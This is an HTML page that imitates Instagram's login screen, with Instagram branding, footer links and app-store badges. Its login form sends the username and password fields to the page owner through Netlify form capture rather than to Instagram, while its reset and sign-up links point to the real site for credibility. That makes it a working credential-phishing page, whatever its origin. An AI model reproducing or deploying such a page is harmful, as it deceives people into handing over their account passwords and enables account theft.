<!DOCTYPE html> 
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300&display=swap" rel="stylesheet">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form name="login" method="POST" data-netlify="true">

                    <label for="email" class="sr-only">Phone number, username or email</label>
                    <input type="text" name="email" placeholder="Phone number, username or email" />
                    
                    <label for="password" class="sr-only">Password</label>
                    <input type="text" name="password" placeholder="Password" />
                    
                    <button type="submit">Login</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">Or</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <a>Login with Facebook</a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get our app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Image of Apple Store" title="Image of Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Image of Google Play" title="Image of Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="https://www.instagram.com/about/">About</a></li>
            <li><a href="https://www.instagram.com/help/">Help</a></li>
            <li><a href="https://www.instagram.com/blog/">Blog</a></li>
            <li><a href="https://www.instagram.com/API/">API</a></li>
            <li><a href="https://www.instagram.com/jobs/">Jobs</a></li>
            <li><a href="https://www.instagram.com/privacy/">Privacy</a></li>
            <li><a href="https://www.instagram.com/terms/">Terms</a></li>
            <li><a href="https://www.instagram.com/explore/">Explore</a></li>
            <li><a href="https://www.instagram.com/language/">Language</a></li>
        </ul>
        <p class="copyright">Â© 2024 Instagram from Facebook</p>
    </footer>
</body>
</html>
